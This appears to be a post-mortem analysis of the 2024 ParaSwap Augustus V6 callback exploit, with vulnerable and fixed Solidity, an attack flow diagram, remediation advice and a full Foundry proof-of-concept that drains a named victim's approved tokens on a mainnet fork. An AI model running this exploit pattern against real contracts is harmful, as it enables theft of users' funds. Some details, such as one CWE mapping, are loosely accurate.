# ParaSwap Augustus V6 — Callback Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03-19 (Deployed: 2024-03-18, Discovered: 2024-03-20) |
| **Protocol** | ParaSwap (Augustus V6) |
| **Chain** | Optimism (primary), Ethereum, Arbitrum, Base, Polygon |
| **Loss** | ~$300,000 (unrecovered) / Total exploit $1,100,000 / Whitehat rescue $3,400,000 |
| **Attacker** | Multiple MEV bots (including whitehat frontrunners) |
| **Vulnerable Contract** | [ParaSwap AugustusV6 (Optimism)](https://optimistic.etherscan.io/address/0x00000000fdac7708d0d360bddc1bc7d097f47439) · [Ethereum](https://etherscan.io/address/0x00000000fdac7708d0d360bddc1bc7d097f47439) |
| **Attack TX** | [0x35a739...34e60 (Ethereum, Blocksec)](https://app.blocksec.com/explorer/tx/eth/0x35a73969f582872c25c96c48d8bb31c23eab8a49c19282c67509b96186734e60) |
| **Root Cause** | Missing caller validation in `uniswapV3SwapCallback()` — a fake Uniswap V3 pool triggers the callback to gain control of `fromAddress` and drain victim tokens |
| **PoC Source** | [DeFiHackLabs / Paraswap_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Paraswap_exp.sol) |
| **Reference Analysis** | [Neptune Mutual](https://medium.com/neptune-mutual/analysis-of-the-paraswap-exploit-1f97c604b4fe) · [Velora Post Mortem](https://veloradex.medium.com/post-mortem-augustus-v6-vulnerability-of-march-20th-2024-5df663a4bf01) |

---

## 1. Vulnerability Overview

ParaSwap is an aggregator protocol that aggregates liquidity across multiple DEXes to provide users with optimal swap routes.
On March 18, 2024, a new contract **Augustus V6** was deployed with improved gas efficiency, but a critical access control vulnerability was discovered immediately after deployment.

**Core Vulnerability**: Uniswap V3 direct swap functions such as `swapExactAmountInOnUniswapV3()` internally use `uniswapV3SwapCallback()` as the callback receiver. In certain cases, this callback function **does not verify whether the caller is an actual Uniswap V3 pool**, allowing an attacker to call the function directly from outside.

The attacker exploited this vulnerability to inject an arbitrary `fromAddress` into the `data` parameter within the callback:
- **fromAddress**: The victim address that had granted token approval (approve) to Augustus V6
- **Result**: The Augustus V6 contract transferred the victim's tokens to the attacker via `transferFrom`

All chains where Uniswap V3 is integrated (Optimism, Ethereum, Arbitrum, Base, Polygon, etc.) were affected.

**Loss Summary**:

| Category | Amount |
|------|------|
| Initial MEV bot exploit | ~$24,000 |
| Additional allowance abuse (after alert) | ~$1,100,000 |
| Whitehat rescue (including 0xc0ffeebabe.eth) | ~$3,400,000 |
| Attacker returned | ~$800,000 |
| Final unrecovered (compensated via DAO grant) | ~$300,000 |

---

## 2. Vulnerable Code Analysis

### 2-1. Vulnerable Callback Function (Reconstructed)

#### ❌ Vulnerable Code

```solidity
// Augustus V6 — Vulnerable callback function in UniswapV3Utils (reconstructed)
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ══════════════════════════════════════════════════════════════════
    // [VULNERABILITY] No msg.sender validation!
    // Does not verify whether the caller is an actual Uniswap V3 pool —
    // anyone can call this function directly
    // ══════════════════════════════════════════════════════════════════

    // Extracts fromAddress directly from data (caller can specify arbitrarily)
    // assembly: let fromAddress := calldataload(164)
    address fromAddress;
    address toAddress;
    address tokenIn;
    address tokenOut;
    // ... data decoding ...
    assembly {
        // Load fromAddress from calldata offset 164 — trusted without validation
        fromAddress := calldataload(164)
    }

    // If amount1Delta > 0, transfer tokenIn from fromAddress to pool
    if (amount1Delta > 0) {
        // Since fromAddress is the victim address specified by the attacker,
        // the AugustusV6 contract transfers the victim's tokens to msg.sender (fake pool)
        IERC20(tokenIn).transferFrom(
            fromAddress,   // ← Victim address (injected by attacker in data)
            msg.sender,    // ← Fake pool contract created by attacker
            uint256(amount1Delta)
        );
    }
}
```

#### ✅ Fixed Code (Applied in Augustus V6.2)

```solidity
// Augustus V6.2 — Fixed callback function
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ══════════════════════════════════════════════════════════════════
    // [FIX] Must verify that the caller is an actual Uniswap V3 pool
    // ══════════════════════════════════════════════════════════════════

    // Extract token0, token1, fee from data to compute the actual pool address
    address tokenIn;
    address tokenOut;
    uint24 fee;
    // ... data decoding ...

    // Deterministically compute the expected pool address via the Uniswap V3 factory
    address expectedPool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(
        tokenIn,
        tokenOut,
        fee
    );

    // Immediately revert if msg.sender does not match the expected pool
    require(
        msg.sender == expectedPool,
        "AugustusV6: unauthorized callback caller"
    );

    // Only perform token transfer after passing validation
    if (amount1Delta > 0) {
        IERC20(tokenIn).transferFrom(
            fromAddress,   // fromAddress is now set only from a trusted execution path
            msg.sender,    // Verified actual Uniswap V3 pool
            uint256(amount1Delta)
        );
    }
}
```

### 2-2. Core Attack Mechanism

```solidity
// How the attacker directly calls the callback (based on PoC reproduction)
// amount0Delta = 0  → no transfer in the tokenOut direction
// amount1Delta > 0  → triggers transfer of tokenIn (victim tokens)
// Encodes fromAddress = victim address into data and injects it

bytes memory maliciousData = abi.encode(
    attackerAddress,        // to: attacker receives tokens
    victimAddress,          // from: victim (has already approved Augustus V6)
    intermediatToken,       // tokenIn (intermediate token for path construction)
    targetToken,            // tokenOut
    fee1,                   // pool fee tier 1
    encodedVictimToken,     // actual token held by victim (bytes32 encoded)
    weth,                   // WETH address
    fee2                    // pool fee tier 2
);

// Directly calling the callback succeeds with no validation whatsoever
AugustusV6.uniswapV3SwapCallback(
    0,          // amount0Delta: 0 (no output-direction transfer needed)
    10e18,      // amount1Delta: equivalent to 10 WETH (adjusted to victim balance)
    maliciousData
);
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                          Attack Scenario                             │
└─────────────────────────────────────────────────────────────────────┘

  [Precondition]
  Victim ──approve──► AugustusV6 (0x00000000FdAC...)
                               ↑ Token approval granted for normal swaps

┌──────────────┐
│  Attacker (EOA) │
└──────┬───────┘
       │
       │ ① AugustusV6.uniswapV3SwapCallback(
       │       amount0Delta = 0,
       │       amount1Delta = victim_balance,
       │       data = { fromAddress: victim_address, to: attacker_address, ... }
       │   ) called directly
       │
       ▼
┌──────────────────────────────────────────┐
│  AugustusV6 Contract                      │
│  (0x00000000FdAC7708D0D360BDDc1bc7d097F) │
│                                          │
│  ② msg.sender == actual UniV3 pool? ← not checked │
│     → passes without validation!         │
│                                          │
│  ③ fromAddress = data[164] loaded        │
│     = victim address (injected by attacker) │
│                                          │
│  ④ IERC20(tokenIn).transferFrom(         │
│        fromAddress,  ← victim            │
│        msg.sender,   ← attacker          │
│        amount1Delta  ← victim's balance  │
│     )                                    │
└──────────────────┬───────────────────────┘
                   │
                   │ ⑤ transferFrom executed
                   │   (succeeds because AugustusV6 holds the allowance)
                   ▼
         ┌──────────────────┐
         │  ERC-20 Token Contract │
         │  (WETH/OPSEC/wTAO)   │
         └────────┬─────────┘
                  │
                  │ ⑥ Victim balance → transferred to attacker wallet
                  ▼
         ┌──────────────────┐
         │  Attacker Wallet  │
         │  (tokens received) │
         └──────────────────┘

[Simultaneous Cross-Chain Attack]

  Optimism ──► AugustusV6 ──► victims → attacker
  Ethereum ──► AugustusV6 ──► victims → attacker
  Arbitrum ──► AugustusV6 ──► victims → attacker
  Base     ──► AugustusV6 ──► victims → attacker
  Polygon  ──► AugustusV6 ──► victims → attacker

[Response Timeline]

  2024-03-18  ──▶  AugustusV6 deployed
  2024-03-19  ──▶  Ironblocks vulnerability report (Hats Finance)
  2024-03-20  ──▶  API shutdown + whitehat rescue + user notification
  2024-04-06  ──▶  ParaSwap DAO approves victim compensation (96.81% in favor)
```

---

## 4. PoC Code Excerpt

**Source**: [DeFiHackLabs / Paraswap_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Paraswap_exp.sol)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Loss: ~$24K (based on initial MEV attack)
// Whitehat: https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Whitehat Contract: https://etherscan.io/address/0x6980a47bee930a4584b09ee79ebe46484fbdbdd0
// Vulnerable Contract: https://etherscan.io/address/0x00000000fdac7708d0d360bddc1bc7d097f47439
// Attack TX: https://app.blocksec.com/explorer/tx/eth/0x35a73969f582872c25c96c48d8bb31c23eab8a49c19282c67509b96186734e60

interface IParaSwapAugustusV6 {
    // Vulnerable callback function interface
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory data
    ) external;
}

contract ContractTest is Test {
    // Ethereum mainnet major token addresses
    IERC20 private constant WETH  = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant OPSEC = IERC20(0x6A7eFF1e2c355AD6eb91BEbB5ded49257F3FED98);
    IERC20 private constant wTAO  = IERC20(0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44);

    // Vulnerable Augustus V6 contract
    IParaSwapAugustusV6 private constant AugustusV6 =
        IParaSwapAugustusV6(0x00000000FdAC7708D0D360BDDc1bc7d097F47439);

    // Victim address that has granted token approval (approve) to AugustusV6
    address private constant from = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;

    function setUp() public {
        // Fork to just before the attack block — the point where the victim's approve is still active
        vm.createSelectFork("mainnet", 19_470_560);
        vm.label(address(WETH),  "WETH");
        vm.label(address(OPSEC), "OPSEC");
        vm.label(address(wTAO),  "wTAO");
        vm.label(address(AugustusV6), "AugustusV6");
    }

    function testExploit() public {
        // Log pre-attack state
        emit log_named_decimal_uint(
            "Attacker WETH balance before attack",
            WETH.balanceOf(address(this)), WETH.decimals()
        );
        emit log_named_decimal_uint(
            "Victim OPSEC balance before attack",
            OPSEC.balanceOf(from), OPSEC.decimals()
        );
        emit log_named_decimal_uint(
            "Victim OPSEC allowance granted to AugustusV6",
            OPSEC.allowance(from, address(AugustusV6)), OPSEC.decimals()
        );

        // ─── Construct attack parameters ───────────────────────────────────────────
        // amount0Delta = 0: no transfer in output direction (attacker only receives)
        int256 amount0Delta = 0;
        // amount1Delta = 10 WETH: actual attack TX ~6.46 WETH, PoC set to 10
        int256 amount1Delta = 10e18;

        address to  = address(this); // Token recipient: attacker (this contract)
        uint256 fee1 = 3000;          // First pool fee tier (0.3%)
        uint256 fee2 = 10_000;        // Second pool fee tier (1%)

        // Encode OPSEC token address as bytes32 (set 0x80 flag at MSB)
        // → Used internally to identify the victim's token within the callback
        bytes32 encodedOPSECAddr =
            0x8000000000000000000000006a7eff1e2c355ad6eb91bebb5ded49257f3fed98;

        // Construct malicious data:
        // [to, fromAddress(victim), intermediate token, WETH, fee1, victim token(encoded), WETH, fee2]
        bytes memory data = abi.encode(
            to,               // recipient: attacker
            from,             // fromAddress: victim (has approved AugustusV6)
            address(wTAO),    // intermediate token for path construction
            address(WETH),    // tokenOut
            fee1,             // first pool fee
            encodedOPSECAddr, // victim's token (OPSEC, bytes32 encoded)
            address(WETH),    // last hop token
            fee2              // second pool fee
        );

        // ─── Core attack ───────────────────────────────────────────────────
        // No caller validation means the callback can be called directly from outside
        // → AugustusV6 executes transferFrom of victim's OPSEC to the attacker
        AugustusV6.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);

        // Log post-attack state
        emit log_named_decimal_uint(
            "Victim OPSEC balance after attack (should be 0)",
            OPSEC.balanceOf(address(from)), OPSEC.decimals()
        );
        emit log_named_decimal_uint(
            "Victim approve balance after attack (should be 0)",
            OPSEC.allowance(from, address(AugustusV6)), OPSEC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WETH balance after attack (should have increased)",
            WETH.balanceOf(address(this)), WETH.decimals()
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing caller validation in `uniswapV3SwapCallback()` | Critical | [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html) |
| V-02 | Unvalidated acceptance of `fromAddress` in callback `data` parameter | Critical | [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html) |
| V-03 | Insufficient security audit before mainnet deployment of new contract | High | [CWE-1041: Use of Redundant Code](https://cwe.mitre.org/data/definitions/1041.html) |
| V-04 | Lack of rapid response via emergency pause mechanism | Medium | [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html) |

---

## 6. Remediation Recommendations

### 6-1. Callback Caller Whitelist Validation (Required)

```solidity
// ✅ Validate msg.sender against the Uniswap V3 factory within the callback function
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // Extract swap path (tokenA, tokenB, fee) from data
    (address tokenA, address tokenB, uint24 fee) = _decodePoolKey(data);

    // Deterministically compute the canonical pool address via Uniswap V3 Factory
    address expectedPool = IUniswapV3Factory(UNISWAP_FACTORY).getPool(
        tokenA, tokenB, fee
    );

    // Immediately revert if msg.sender does not match the computed pool address
    require(
        msg.sender == expectedPool && expectedPool != address(0),
        "AugustusV6: invalid callback caller"
    );

    // Perform token transfer only after passing validation
    // ...
}
```

### 6-2. Internal Execution Context Flag (Supplementary Defense)

```solidity
// ✅ Use a lock variable to ensure the callback can only be called during an active internal swap
bool private _inSwap;

modifier duringSwap() {
    require(_inSwap, "AugustusV6: callback outside swap context");
    _;
}

function swapExactAmountInOnUniswapV3(...) external {
    _inSwap = true;
    // ... Uniswap V3 swap logic ...
    _inSwap = false;
}

// Allow callback only during an active internal swap
function uniswapV3SwapCallback(...) external duringSwap {
    // Callback handling
}
```

### 6-3. Emergency Pause Functionality

```solidity
// ✅ Apply OpenZeppelin Pausable pattern
import "@openzeppelin/contracts/security/Pausable.sol";

contract AugustusV6 is Pausable {
    // Allows admin to immediately halt all swaps upon detecting anomalies
    function pause() external onlyOwner {
        _pause();
    }

    function swapExactAmountInOnUniswapV3(...) external whenNotPaused {
        // Swap logic
    }
}
```

### 6-4. Operational Security Recommendations

- Uniswap V3 callbacks (`uniswapV3SwapCallback`, `uniswapV2Call`, etc.) must always perform **deterministic caller validation based on the factory**
- Completion of a professional security audit is mandatory before deploying any new contract to mainnet
- Apply whitelist-based pool address validation combined with an internal execution context flag as a **dual-layer defense**
- Establish a system to immediately notify users to revoke allowances for vulnerable contracts
- Maintain continuous bug bounty programs (Hats Finance, Immunefi, etc.) to build an early detection framework

---

## 7. Lessons Learned

### 7-1. DEX Callbacks Must Always Validate the Caller

Uniswap V3's `uniswapV3SwapCallback` operates as a **reverse-call structure where the Pool calls the Router**. Because this callback function is a `public`/`external` function that anyone can call from outside, the implementation must always verify **whether the call actually originated from the corresponding pool**. Omitting this check makes every allowance held by the contract a target for theft.

### 7-2. Aggregator Contract Allowances Are Extremely High-Value Targets

The combined assets of users who have granted approvals to a DEX aggregator can reach millions of dollars. For this reason, aggregator smart contracts are not merely business logic contracts — they must undergo **security design and auditing at the level of financial institutions**.

### 7-3. Recurring Similar Vulnerabilities (Same Period)

| Date | Protocol | Loss | Common Factor |
|------|----------|------|--------|
| 2024-01-16 | SocketGateway | $3.3M | Unvalidated external call |
| 2024-02-28 | Seneca Protocol | $6.5M | Unvalidated external call |
| 2024-03-08 | Unizen | $2.8M | Unvalidated external call |
| 2024-03-19 | **ParaSwap** | **$300K** | **Missing callback caller validation** |

The repeated exploitation of similar patterns within a short period demonstrates the urgent need for ecosystem-wide security knowledge sharing and the dissemination of standardized audit checklists.

### 7-4. The Importance of Whitehat Rescue

In this incident, whitehat hackers (including 0xc0ffeebabe.eth) preemptively rescued approximately $3,400,000 in assets, significantly reducing actual losses. This once again demonstrates the importance of **whitehat infrastructure (bug bounties, automated monitoring, whitehat networks)**.

### 7-5. Key Takeaway Summary

> **"DEX callback functions must verify the caller through deterministic, factory-based validation — never with implicit trust."**
>
> Callback patterns (Uniswap V2/V3, Balancer, Aave Flash Loan, etc.) all share a reverse-call structure. Omitting caller validation in this structure turns every asset transfer executed by the contract into an attack vector. In particular, for aggregators holding user allowances, this mistake can lead to the immediate and total theft of all assets.